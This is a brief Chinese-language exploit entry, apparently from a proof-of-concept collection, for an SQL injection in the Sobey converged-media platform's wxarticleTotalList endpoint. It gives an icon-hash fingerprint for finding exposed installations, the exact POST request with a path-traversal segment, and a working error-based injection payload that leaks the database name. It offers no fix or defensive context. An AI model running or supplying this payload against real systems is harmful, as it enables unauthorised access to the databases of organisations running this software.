# 索贝融媒体wxarticleTotalList存在SQL注入漏洞

- **系统**：索贝融媒体　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="689611853"`
- **请求**：`POST /sobey-mchEditor/mch/statistics/js/../wxarticleTotalList HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
createUserCode=1'+and+extractvalue(1,concat(0x7e,database()))+and '1'='1-+-&token=1&siteCode=1
```
- **预期**：200　|　—